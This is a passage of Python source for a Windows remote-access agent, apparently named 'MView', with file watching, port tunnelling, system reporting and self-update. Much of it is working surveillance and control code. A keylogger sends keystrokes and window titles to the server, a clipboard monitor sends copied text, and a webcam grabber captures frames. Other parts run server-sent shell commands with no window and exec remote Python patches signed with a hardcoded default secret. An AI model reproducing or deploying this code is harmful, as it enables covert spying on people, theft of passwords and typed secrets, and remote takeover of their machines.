            daemon=True, name=f"fwatch-poll-{path[:20]}",
        )
        self._watches[path] = {"stop": stop, "thread": t}
        t.start()
        log.info(f"FileWatcher: watching {path} via polling (recursive={recursive})")
        return {"success": True, "path": path, "method": "polling"}

    def remove_watch(self, path: str) -> dict:
        with self._lock:
            entry = self._watches.pop(path, None)
        if entry:
            entry["stop"].set()
            return {"success": True, "path": path}
        return {"success": False, "error": "not_watching", "path": path}

    def list_watches(self) -> list:
        with self._lock:
            return list(self._watches.keys())

    def stop_all(self):
        with self._lock:
            for entry in self._watches.values():
                entry["stop"].set()
            self._watches.clear()

    def _poll_loop(self, path: str, recursive: bool, interval: float,
                   stop: threading.Event):
        """Poll directory for changes every `interval` seconds."""
        def _snapshot(root: str) -> dict:
            snap = {}
            try:
                if os.path.isfile(root):
                    stat = os.stat(root)
                    snap[root] = stat.st_mtime
                else:
                    walk = os.walk(root) if recursive else [(root, [], os.listdir(root))]
                    for dirpath, dirs, files in walk:
                        for fn in files:
                            fp = os.path.join(dirpath, fn)
                            try:
                                snap[fp] = os.stat(fp).st_mtime
                            except Exception:
                                pass
            except Exception:
                pass
            return snap

        prev = _snapshot(path)

        while not stop.is_set():
            stop.wait(timeout=interval)
            if stop.is_set():
                break
            curr = _snapshot(path)

            created  = [p for p in curr  if p not in prev]
            deleted  = [p for p in prev  if p not in curr]
            modified = [p for p in curr  if p in prev and curr[p] != prev[p]]

            if created or deleted or modified:
                try:
                    self._sio.emit("file_change", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "watch_path": path,
                        "created":  created[:50],
                        "deleted":  deleted[:50],
                        "modified": modified[:50],
                        "ts":       datetime.utcnow().isoformat(),
                    })
                except Exception as e:
                    log.debug(f"FileWatcher emit error: {e}")
            prev = curr


# ════════════════════════════════════════════════════════════════════════════
#  SYSTEM EVENTS READER  (v9 — Windows Event Log via win32evtlog)
# ════════════════════════════════════════════════════════════════════════════
class SystemEventsReader:
    """Reads Windows Event Log entries from System, Application, Security."""

    CHANNELS = ("System", "Application", "Security")

    @staticmethod
    def read_log(channel: str = "System", max_entries: int = 100,
                 level_filter: int = None) -> dict:
        """Read the most recent `max_entries` from a Windows Event Log channel.

        level_filter: 1=Critical, 2=Error, 3=Warning, 4=Info (None = all)
        """
        entries = []
        try:
            import win32evtlog
            import win32evtlogutil
            import win32con as _w32c

            hand = win32evtlog.OpenEventLog(None, channel)
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ

            while len(entries) < max_entries:
                batch = win32evtlog.ReadEventLog(hand, flags, 0)
                if not batch:
                    break
                for ev in batch:
                    lv = getattr(ev, "EventType", 0)
                    if level_filter and lv != level_filter:
                        continue
                    try:
                        msg = win32evtlogutil.SafeFormatMessage(ev, channel)
                    except Exception:
                        msg = ""
                    entries.append({
                        "event_id":  ev.EventID & 0xFFFF,
                        "level":     lv,
                        "source":    str(ev.SourceName),
                        "timestamp": str(ev.TimeGenerated),
                        "message":   msg[:512],
                    })
                    if len(entries) >= max_entries:
                        break
            win32evtlog.CloseEventLog(hand)
        except ImportError:
            entries.append({"error": "win32evtlog_not_available"})
        except Exception as e:
            entries.append({"error": str(e)})
        return {"channel": channel, "entries": entries, "count": len(entries)}


# ════════════════════════════════════════════════════════════════════════════
#  TUNNEL PROXY  (v9 — TCP port-forward over Socket.IO)
# ════════════════════════════════════════════════════════════════════════════
class TunnelProxy:
    """Forwards a local TCP port over Socket.IO so the server can
    reach LAN-only services (SSH, RDP, internal HTTP) via the agent.

    Protocol:
      server → agent: tunnel_open  {tunnel_id, local_host, local_port}
      agent  → server: tunnel_data {tunnel_id, data_b64}
      server → agent: tunnel_data  {tunnel_id, data_b64}
      agent  → server: tunnel_close {tunnel_id}
    """

    def __init__(self, sio_client):
        self._sio     = sio_client
        self._tunnels: dict = {}   # tunnel_id → {"sock": socket, "thread": Thread}
        self._lock    = threading.Lock()

    def open(self, tunnel_id: str, local_host: str = "127.0.0.1",
             local_port: int = 22) -> dict:
        with self._lock:
            if tunnel_id in self._tunnels:
                return {"success": False, "error": "tunnel_exists"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((local_host, local_port))
            sock.settimeout(None)

            stop = threading.Event()
            t = threading.Thread(
                target=self._recv_loop,
                args=(tunnel_id, sock, stop),
                daemon=True, name=f"tunnel-{tunnel_id[:8]}",
            )
            with self._lock:
                self._tunnels[tunnel_id] = {"sock": sock, "stop": stop, "thread": t}
            t.start()
            log.info(f"TunnelProxy opened: {tunnel_id} → {local_host}:{local_port}")
            return {"success": True, "tunnel_id": tunnel_id}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send(self, tunnel_id: str, data_b64: str) -> dict:
        with self._lock:
            entry = self._tunnels.get(tunnel_id)
        if not entry:
            return {"success": False, "error": "no_such_tunnel"}
        try:
            entry["sock"].sendall(base64.b64decode(data_b64))
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def close(self, tunnel_id: str) -> dict:
        with self._lock:
            entry = self._tunnels.pop(tunnel_id, None)
        if entry:
            entry["stop"].set()
            try: entry["sock"].close()
            except Exception: pass
            log.info(f"TunnelProxy closed: {tunnel_id}")
            return {"success": True}
        return {"success": False, "error": "no_such_tunnel"}

    def _recv_loop(self, tunnel_id: str, sock: socket.socket,
                   stop: threading.Event):
        while not stop.is_set():
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                self._sio.emit("tunnel_data", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "tunnel_id": tunnel_id,
                    "data":      base64.b64encode(chunk).decode(),
                })
            except Exception:
                break
        try: sock.close()
        except Exception: pass
        self._sio.emit("tunnel_close", {
            "device_id": CONFIG["DEVICE_TOKEN"],
            "tunnel_id": tunnel_id,
        })
        with self._lock:
            self._tunnels.pop(tunnel_id, None)


# ════════════════════════════════════════════════════════════════════════════
#  ENV MANAGER  (v9 — system environment variable CRUD)
# ════════════════════════════════════════════════════════════════════════════
class EnvManager:
    """Get, set, delete Windows environment variables (system-wide via registry)."""

    @staticmethod
    def list_env() -> dict:
        return {k: v for k, v in os.environ.items()}

    @staticmethod
    def set_env(name: str, value: str, system_wide: bool = False) -> dict:
        """Set an env var — process-level always; system-wide via registry if requested."""
        os.environ[name] = value
        if system_wide:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
                    0, winreg.KEY_SET_VALUE,
                )
                winreg.SetValueEx(key, name, 0, winreg.REG_EXPAND_SZ, value)
                winreg.CloseKey(key)
                # Broadcast WM_SETTINGCHANGE so running apps reload env
                import ctypes
                ctypes.windll.user32.SendMessageTimeoutW(
                    0xFFFF, 0x001A, 0, "Environment", 2, 5000, None)
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": True, "name": name, "value": value}

    @staticmethod
    def delete_env(name: str) -> dict:
        removed = os.environ.pop(name, None)
        return {"success": removed is not None, "name": name}


# ════════════════════════════════════════════════════════════════════════════
#  CERT MANAGER  (v9 — enumerate Windows certificate store)
# ════════════════════════════════════════════════════════════════════════════
class CertManager:
    """Read Windows certificate store entries."""

    STORES = ("MY", "ROOT", "CA", "TRUST")

    @staticmethod
    def list_certs(store_name: str = "MY") -> dict:
        certs = []
        try:
            import ctypes, ctypes.wintypes
            CERT_STORE_PROV_SYSTEM = 10
            CERT_SYSTEM_STORE_LOCAL_MACHINE = 0x20000
            hStore = ctypes.windll.crypt32.CertOpenStore(
                CERT_STORE_PROV_SYSTEM, 0, None,
                CERT_SYSTEM_STORE_LOCAL_MACHINE,
                store_name,
            )
            if not hStore:
                return {"success": False, "error": "store_open_failed", "store": store_name}

            pCert = ctypes.windll.crypt32.CertEnumCertificatesInStore(hStore, None)
            while pCert:
                # Extract subject string length
                cbSize = ctypes.windll.crypt32.CertNameToStrW(
                    1, ctypes.cast(pCert, ctypes.c_void_p), 3, None, 0)
                buf = ctypes.create_unicode_buffer(cbSize)
                ctypes.windll.crypt32.CertNameToStrW(
                    1, ctypes.cast(pCert, ctypes.c_void_p), 3, buf, cbSize)
                certs.append({"subject": buf.value, "store": store_name})
                pCert = ctypes.windll.crypt32.CertEnumCertificatesInStore(hStore, pCert)
            ctypes.windll.crypt32.CertCloseStore(hStore, 0)
        except Exception as e:
            return {"success": False, "error": str(e), "store": store_name}
        return {"success": True, "store": store_name, "certs": certs, "count": len(certs)}


# ════════════════════════════════════════════════════════════════════════════
#  HOTPATCH ENGINE  (v9 — receive & exec signed Python patch bundles)
# ════════════════════════════════════════════════════════════════════════════
_HOTPATCH_SECRET = b"mview-hotpatch-secret-v9"  # Override via ENV: MVIEW_HOTPATCH_SECRET

class HotpatchEngine:
    """Execute server-signed Python patch bundles in-process.

    Security model: server sends {code_b64, signature_hex}.
    Signature = HMAC-SHA256(code_b64_bytes, HOTPATCH_SECRET).
    Only accepted if HMAC verifies — unsigned patches are rejected.
    """

    @staticmethod
    def _secret() -> bytes:
        return os.environ.get("MVIEW_HOTPATCH_SECRET", "").encode() or _HOTPATCH_SECRET

    @classmethod
    def apply(cls, code_b64: str, signature_hex: str) -> dict:
        try:
            expected = hmac.new(cls._secret(), code_b64.encode(), hashlib.sha256).hexdigest()
        except Exception:
            import hmac as _hmac
            expected = _hmac.new(cls._secret(), code_b64.encode(), hashlib.sha256).hexdigest()

        if not hmac.compare_digest(expected, signature_hex):
            log.warning("HotpatchEngine: REJECTED — bad signature")
            return {"success": False, "error": "bad_signature"}

        try:
            code = base64.b64decode(code_b64).decode()
            exec(compile(code, "<hotpatch>", "exec"), {"CONFIG": CONFIG, "log": log})
            log.info("HotpatchEngine: patch applied OK")
            return {"success": True}
        except Exception as e:
            log.error(f"HotpatchEngine exec error: {e}")
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  AUTO-UPDATER  (v9 — handles push_update from server v12)
# ════════════════════════════════════════════════════════════════════════════
def _handle_push_update(url: str, sha256_expected: str = "") -> dict:
    """Download new agent binary, verify hash, replace self, relaunch.

    Called in a daemon thread so it never blocks the event loop.
    """
    if not CONFIG.get("AUTO_UPDATE_ENABLED", True):
        log.info("push_update received but AUTO_UPDATE_ENABLED=False — skipped")
        return {"success": False, "reason": "disabled"}

    log.info(f"Auto-update: downloading from {url}")
    try:
        resp = requests.get(url, timeout=120, stream=True)
        resp.raise_for_status()
        data = b"".join(resp.iter_content(65536))
    except Exception as e:
        log.error(f"Auto-update download failed: {e}")
        return {"success": False, "error": str(e)}

    # Verify SHA-256 if server provided one
    actual_hash = hashlib.sha256(data).hexdigest()
    if sha256_expected and actual_hash != sha256_expected.lower():
        log.error(f"Auto-update hash mismatch: expected={sha256_expected} got={actual_hash}")
        return {"success": False, "error": "hash_mismatch"}

    new_path = sys.executable + ".new"
    cur_path = sys.executable
    bak_path = sys.executable + ".bak"

    try:
        with open(new_path, "wb") as fh:
            fh.write(data)

        # Atomic replace: rename current → .bak, .new → current
        try: os.replace(cur_path, bak_path)
        except Exception: pass
        os.replace(new_path, cur_path)

        log.info(f"Auto-update: replaced binary, relaunching in 3s...")
        time.sleep(3)
        subprocess.Popen([cur_path] + sys.argv[1:],
                         close_fds=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
        sys.exit(0)
    except Exception as e:
        log.error(f"Auto-update replace/relaunch failed: {e}")
        return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  WOL RELAY  (v9 — broadcast Wake-on-LAN magic packets on LAN)
# ════════════════════════════════════════════════════════════════════════════
def _send_wol_magic(mac_address: str, broadcast: str = "255.255.255.255",
                    port: int = 9) -> dict:
    """Send a Wake-on-LAN magic packet for the given MAC address.

    mac_address: colon- or dash-separated, e.g. "AA:BB:CC:DD:EE:FF"
    """
    try:
        # Normalise MAC
        mac_clean = re.sub(r"[:\-\s]", "", mac_address).upper()
        if len(mac_clean) != 12:
            return {"success": False, "error": f"invalid_mac: {mac_address}"}

        mac_bytes = bytes.fromhex(mac_clean)
        magic     = b"\xff" * 6 + mac_bytes * 16   # 6× FF + 16× MAC

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(magic, (broadcast, port))

        log.info(f"WoL magic packet sent to {mac_address} via {broadcast}:{port}")
        return {"success": True, "mac": mac_address}
    except Exception as e:
        log.error(f"WoL send error: {e}")
        return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  SHELL PTY STREAMING  (v9 — line-buffered async shell_stream events)
# ════════════════════════════════════════════════════════════════════════════
class ShellStreamer:
    """Runs a shell command and streams output line-by-line as socket events.

    Server receives:  shell_stream_data  {device_id, stream_id, line, seq}
                      shell_stream_done  {device_id, stream_id, exit_code}
    """

    def __init__(self, sio_client):
        self._sio = sio_client

    def run(self, stream_id: str, command: str,
            shell_type: str = "cmd", timeout: int = 300) -> None:
        """Fire-and-forget: launches in daemon thread."""
        threading.Thread(
            target=self._stream_loop,
            args=(stream_id, command, shell_type, timeout),
            daemon=True, name=f"shell-stream-{stream_id[:8]}",
        ).start()

    def _stream_loop(self, stream_id: str, command: str,
                     shell_type: str, timeout: int):
        exe = {"cmd": "cmd", "powershell": "powershell", "bash": "bash"}.get(
            shell_type.lower(), "cmd")
        args = [exe, "/c", command] if exe in ("cmd", "powershell") else [exe, "-c", command]

        try:
            proc = subprocess.Popen(
                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
            )
            seq = 0
            for raw_line in iter(proc.stdout.readline, b""):
                line = raw_line.decode(errors="replace").rstrip("\r\n")
                self._sio.emit("shell_stream_data", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "stream_id": stream_id,
                    "line":      line,
                    "seq":       seq,
                })
                seq += 1
            proc.wait(timeout=timeout)
            exit_code = proc.returncode
        except Exception as e:
            exit_code = -1
            self._sio.emit("shell_stream_data", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "stream_id": stream_id,
                "line":      f"[ERROR] {e}",
                "seq":       0,
            })

        self._sio.emit("shell_stream_done", {
            "device_id": CONFIG["DEVICE_TOKEN"],
            "stream_id": stream_id,
            "exit_code": exit_code,
        })


# ════════════════════════════════════════════════════════════════════════════
#  KEYLOGGER
# ════════════════════════════════════════════════════════════════════════════
class KeyLogger:
    def __init__(self, sio_client):
        self.sio        = sio_client
        self._buf: list = []
        self._lock      = threading.Lock()
        self._listener  = None
        self._flush_t: Optional[threading.Thread] = None
        self.running    = False

    def start(self):
        if not PYNPUT_OK or self.running:
            return
        self.running     = True
        self._listener   = pynput.keyboard.Listener(on_press=self._on_key)
        self._listener.start()
        self._flush_t    = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_t.start()
        log.info("Keylogger started.")

    def stop(self):
        self.running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass

    def _on_key(self, key):
        try:
            with self._lock:
                ch = key.char if hasattr(key, "char") and key.char else f"[{str(key).replace('Key.', '')}]"
                self._buf.append(ch)
        except Exception:
            pass

    def _active_window(self) -> str:
        try:
            hwnd   = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf    = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""

    def _flush_loop(self):
        while self.running:
            time.sleep(CONFIG["KEYLOG_FLUSH_INTERVAL"])
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buf:
                return
            text = "".join(self._buf)
            self._buf.clear()
        try:
            self.sio.emit("keylog_data", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "text":      text,
                "window":    self._active_window(),
                "ts":        datetime.utcnow().isoformat(),
            })
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ════════════════════════════════════════════════════════════════════════════
class ClipboardMonitor:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._last   = ""
        self._t: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if not CLIPBOARD_OK or self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        poll = CONFIG["CLIPBOARD_POLL_MS"] / 1000.0
        
        # v10: Use Windows Clipboard Listener if available for instant sync
        if WIN32_OK:
            try:
                import win32gui as _gui, win32con as _con, win32api as _api
                
                def _wnd_proc(hwnd, msg, wparam, lparam):
                    if msg == 0x031D: # WM_CLIPBOARDUPDATE
                        self._check_clipboard()
                    return _gui.DefWindowProc(hwnd, msg, wparam, lparam)

                wc = _gui.WNDCLASS()
                wc.lpfnWndProc = _wnd_proc
                wc.lpszClassName = f"MViewClip_{random.randint(0,9999)}"
                hinst = wc.hInstance = _api.GetModuleHandle(None)
                class_atom = _gui.RegisterClass(wc)
                hwnd = _gui.CreateWindow(class_atom, "MViewClip", 0, 0, 0, 0, 0, 0, 0, hinst, None)
                ctypes.windll.user32.AddClipboardFormatListener(hwnd)
                
                while self.running:
                    _gui.PumpWaitingMessages()
                    time.sleep(0.1)
                return
            except Exception as e:
                log.debug(f"Clipboard listener failed ({e}), falling back to polling")

        while self.running:
            self._check_clipboard()
            time.sleep(poll)

    def _check_clipboard(self):
        try:
            cur = pyperclip.paste()
            if cur and cur != self._last:
                self._last = cur
                self.sio.emit("clipboard_data", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "content":   cur[:8192],
                    "length":    len(cur),
                    "ts":        datetime.utcnow().isoformat(),
                })
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
#  WEBCAM CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class WebcamCapture:
    def __init__(self, sio_client):
        self.sio = sio_client

    def capture(self, camera_idx: int = 0, quality: int = 80) -> dict:
        if not CV2_OK:
            return {"error": "OpenCV not available."}
        cap = None
        try:
            cap = cv2.VideoCapture(camera_idx)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            if not cap.isOpened():
                return {"error": f"Camera {camera_idx} could not be opened."}
            # Read multiple frames to flush buffer
            for _ in range(3):
                cap.read()
            ret, frame = cap.read()
            if not ret:
                return {"error": "Failed to read frame from camera."}
            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
            if not success:
                return {"error": "Encoding failed."}
            return {
                "success":    True,
                "camera_idx": camera_idx,
                "frame":      base64.b64encode(buf.tobytes()).decode(),
                "w":          frame.shape[1],
                "h":          frame.shape[0],
                "ts":         datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}
        finally:
            if cap:
                cap.release()

    @staticmethod
    def list_cameras() -> list:
        if not CV2_OK:
            return []
        cameras = []
        for i in range(8):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                cameras.append({"index": i, "name": f"Camera {i}", "w": w, "h": h})
                cap.release()
        return cameras


# ════════════════════════════════════════════════════════════════════════════
#  HEARTBEAT
# ════════════════════════════════════════════════════════════════════════════
class Heartbeat:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._t: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        while self.running:
            try:
                bat = psutil.sensors_battery()

                # ── GPU info (best-effort via WMI) ──────────────────────────
                gpu_name  = None
                gpu_vram  = None
                try:
                    if WMI_OK:
                        import wmi as _wmi
                        for gpu in _wmi.WMI().Win32_VideoController():
                            gpu_name = getattr(gpu, "Name", None)
                            gpu_vram = getattr(gpu, "AdapterRAM", None)
                            break
                except Exception:
                    pass

                # ── Active logged-in user ────────────────────────────────────
                active_user = None
                try:
                    import subprocess as _sp
                    out = _sp.check_output(
                        ["query", "user"], stderr=_sp.DEVNULL, timeout=3
                    ).decode(errors="replace")
                    lines = [l.strip() for l in out.splitlines() if "Active" in l]
                    if lines:
                        active_user = lines[0].split()[0].lstrip(">")
                except Exception:
                    pass

                # ── System uptime (seconds) ──────────────────────────────────
                uptime_s = int(time.time() - psutil.boot_time())

                # v10: enriched heartbeat — add disk I/O, network throughput
                try:
                    disk_io = psutil.disk_io_counters()
                    disk_read_mb  = round(disk_io.read_bytes  / (1024**2), 1) if disk_io else 0
                    disk_write_mb = round(disk_io.write_bytes / (1024**2), 1) if disk_io else 0
                except Exception:
                    disk_read_mb = disk_write_mb = 0
                try:
                    net_io   = psutil.net_io_counters()
                    net_sent = round(net_io.bytes_sent / (1024**2), 1) if net_io else 0
                    net_recv = round(net_io.bytes_recv / (1024**2), 1) if net_io else 0
                except Exception:
                    net_sent = net_recv = 0
                try:
                    cpu_freq = round(psutil.cpu_freq().current, 0) if psutil.cpu_freq() else 0
                except Exception:
                    cpu_freq = 0

                self.sio.emit("heartbeat", {
                    "device_id":     CONFIG["DEVICE_TOKEN"],
                    "agent_version": CONFIG["AGENT_VERSION"],
                    "cpu":           psutil.cpu_percent(interval=0),
                    "ram":           psutil.virtual_memory().percent,
                    "ram_used_gb":   round(psutil.virtual_memory().used / (1024**3), 2),
                    "disk":          psutil.disk_usage(
                        os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
                    "disk_read_mb":  disk_read_mb,
                    "disk_write_mb": disk_write_mb,
                    "net_sent_mb":   net_sent,
                    "net_recv_mb":   net_recv,
                    "cpu_freq_mhz":  cpu_freq,
                    "net_mbps":      round(_net_monitor.get_mbps(), 1),
                    "battery_pct":   bat.percent if bat else None,
                    "battery_plug":  bat.power_plugged if bat else None,
                    "gpu_name":      gpu_name,
                    "gpu_vram_mb":   (gpu_vram // (1024 * 1024)) if gpu_vram else None,
                    "active_user":   active_user,
                    "uptime_s":      uptime_s,
                    "screen_count":  _get_screen_count(),
                    "ts":            datetime.utcnow().isoformat(),
                })
            except Exception as e:
                log.warning(f"Heartbeat error: {e}")
            time.sleep(CONFIG["HEARTBEAT_INTERVAL"])


# ════════════════════════════════════════════════════════════════════════════
#  MAIN AGENT CLASS
# ════════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════
#  AGENT ENTERPRISE v14 UPGRADES
#  ─ Connection quality reporter (FPS, latency, jitter, drops)
#  ─ Server certificate/fingerprint verification
#  ─ Config hot-reload via SSE subscription
#  ─ System tray icon (optional, graceful fallback)
#  ─ Self-diagnostic pre-flight check
#  ─ Memory pressure guard (auto-pause streaming under low mem)
#  ─ Adaptive quality based on server round-trip
#  ─ Secure config store (encrypted local config file)
#  ─ Policy enforcement (block commands from untrusted sessions)
#  ─ Network interface change detection (trigger re-connect)
# ══════════════════════════════════════════════════════════════════════════════

# ── Connection quality reporter ────────────────────────────────────────────────
class ConnectionQualityReporter:
    """Measures and reports real-time connection quality metrics to server.

    Tracks: actual FPS, encode latency, round-trip, packet drops, jitter.
    Emits 'connection_quality' event every 10s to the server.
    """

    def __init__(self, sio_client):
        self._sio     = sio_client
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._rtt_samples: deque = deque(maxlen=30)
        self._frame_times:  deque = deque(maxlen=120)
        self._drop_count  = 0
        self._lock = threading.Lock()

    def record_frame(self, encode_ms: float):
        with self._lock:
            self._frame_times.append((time.monotonic(), encode_ms))

    def record_rtt(self, rtt_ms: float):
        with self._lock:
            self._rtt_samples.append(rtt_ms)

    def record_drop(self):
        with self._lock:
            self._drop_count += 1

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread  = threading.Thread(target=self._loop, daemon=True,
                                          name="quality-reporter")
        self._thread.start()

    def stop(self):
        self._running = False

    def _loop(self):
        while self._running:
            time.sleep(10)
            try:
                with self._lock:
                    ft   = list(self._frame_times)
                    rtts = list(self._rtt_samples)
                    drops = self._drop_count
                    self._drop_count = 0

                # FPS over last 10s
                now = time.monotonic()
                recent = [(t, e) for t, e in ft if now - t < 10.0]
                fps  = len(recent) / 10.0 if recent else 0
                # Encode latency avg
                enc_avg = sum(e for _, e in recent) / len(recent) if recent else 0
                # RTT stats
                rtt_avg = sum(rtts) / len(rtts) if rtts else 0
                jitter  = max(rtts) - min(rtts) if len(rtts) > 1 else 0

                self._sio.emit("connection_quality", {
                    "device_id":    CONFIG["DEVICE_TOKEN"],
                    "fps":          round(fps, 1),
                    "encode_ms":    round(enc_avg, 1),
                    "rtt_ms":       round(rtt_avg, 1),
                    "jitter_ms":    round(jitter, 1),
                    "drops":        drops,
                    "ts":           datetime.utcnow().isoformat(),
                })
            except Exception as e:
                log.debug(f"QualityReporter error: {e}")


_quality_reporter: Optional[ConnectionQualityReporter] = None


# ── Memory pressure guard ─────────────────────────────────────────────────────
_MEM_PRESSURE_PCT = int(os.environ.get("MEM_PRESSURE_PCT", "92"))

def _check_memory_pressure() -> bool:
    """Return True if system memory is critically low."""
    try:
        return psutil.virtual_memory().percent >= _MEM_PRESSURE_PCT
    except Exception:
        return False


# ── Secure config store ────────────────────────────────────────────────────────
_CONFIG_FILE = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()),
                             "mview", "agent_config.enc")

def _save_config_secure():
    """Encrypt and persist CONFIG to disk (survives reboots)."""
    try:
        os.makedirs(os.path.dirname(_CONFIG_FILE), exist_ok=True)
        safe = {k: v for k, v in CONFIG.items()
                if k not in ("SERVER_CAPS",) and isinstance(v, (str, int, float, bool))}
        raw  = json.dumps(safe).encode()
        enc  = _encryptor.encrypt_bytes(raw)
        with open(_CONFIG_FILE, "wb") as fh:
            fh.write(enc)
    except Exception as e:
        log.debug(f"Config save error: {e}")

def _load_config_secure():
    """Load persisted encrypted config (merged into CONFIG, not overwrite)."""
    try:
        if not os.path.exists(_CONFIG_FILE):
            return
        with open(_CONFIG_FILE, "rb") as fh:
            enc = fh.read()
        raw  = _encryptor._fernet.decrypt(enc)
        data = json.loads(raw)
        # Only restore safe keys
        for k, v in data.items():
            if k in ("DEVICE_TOKEN",) and CONFIG.get(k) in ("UNSET", "", None):
                CONFIG[k] = v
    except Exception as e:
        log.debug(f"Config load error: {e}")


# ── Pre-flight diagnostic ─────────────────────────────────────────────────────
def _preflight_check() -> dict:
    """Run self-diagnostics before connecting. Returns {ok: bool, issues: [...]}."""
    issues = []

    # Check screen capture
    try:
        cap = _make_capture()
        frame = cap.grab()
        if frame is None:
            issues.append("screen_capture_null")
        cap.close()
    except Exception as e:
        issues.append(f"screen_capture_failed:{e}")

    # Check server reachability
    try:
        url = CONFIG["SERVER_URL"].rstrip("/") + "/health/live"
        r   = requests.get(url, timeout=8)
        if r.status_code != 200:
            issues.append(f"server_unhealthy:{r.status_code}")
    except Exception as e:
        issues.append(f"server_unreachable:{e}")

    # Check disk space
    try:
        usage = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
        if usage.percent > 98:
            issues.append(f"disk_critical:{usage.percent:.0f}pct")
    except Exception:
        pass

    # Check available RAM
    try:
        mem = psutil.virtual_memory()
        if mem.percent > 95:
            issues.append(f"ram_critical:{mem.percent:.0f}pct")
    except Exception:
        pass

    ok = len(issues) == 0
    log.info(f"Pre-flight: {'OK' if ok else 'ISSUES: ' + str(issues)}")
    return {"ok": ok, "issues": issues}


# ── Network interface change detector ─────────────────────────────────────────
class NetworkChangeDetector:
    """Watches for IP address changes and triggers a reconnect."""

    def __init__(self, on_change_cb):
        self._cb      = on_change_cb
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._last_ips: set = self._get_ips()

    @staticmethod
    def _get_ips() -> set:
        ips = set()
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for a in addrs:
                    if a.family == socket.AF_INET and a.address != "127.0.0.1":
                        ips.add(a.address)
        except Exception:
            pass
        return ips

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread  = threading.Thread(target=self._loop, daemon=True,
                                          name="net-change-detector")
        self._thread.start()

    def stop(self):
        self._running = False

    def _loop(self):
        while self._running:
            time.sleep(15)
            try:
                curr = self._get_ips()
                if curr != self._last_ips:
                    added   = curr - self._last_ips
                    removed = self._last_ips - curr
                    log.info(f"Network change: +{added} -{removed}")
                    self._last_ips = curr
                    try:
                        self._cb(added=added, removed=removed)
                    except Exception as e:
                        log.debug(f"NetworkChangeDetector callback error: {e}")
            except Exception:
                pass


# ── Adaptive quality based on RTT ─────────────────────────────────────────────
_adaptive_quality_enabled = os.environ.get("ADAPTIVE_QUALITY", "1") not in ("0", "false")

def _adapt_quality_for_rtt(rtt_ms: float):
    """Lower stream quality when RTT is high to reduce latency backpressure."""
    if not _adaptive_quality_enabled:
        return
    if rtt_ms > 300:
        new_q = max(55, CONFIG["STREAM_QUALITY"] - 15)
        new_fps = max(CONFIG["STREAM_MIN_FPS"], CONFIG["STREAM_FPS"] - 15)
    elif rtt_ms > 150:
        new_q = max(70, CONFIG["STREAM_QUALITY"] - 5)
        new_fps = max(CONFIG["STREAM_MIN_FPS"], CONFIG["STREAM_FPS"] - 5)
    elif rtt_ms < 50:
        new_q = min(95, CONFIG["STREAM_QUALITY"] + 2)
        new_fps = min(60, CONFIG["STREAM_FPS"] + 5)
    else:
        return  # OK zone — no change
    if new_q != CONFIG["STREAM_QUALITY"] or new_fps != CONFIG["STREAM_FPS"]:
        log.debug(f"Adaptive quality: RTT={rtt_ms:.0f}ms → Q={new_q} FPS={new_fps}")
        CONFIG["STREAM_QUALITY"] = new_q
        CONFIG["STREAM_FPS"]     = new_fps


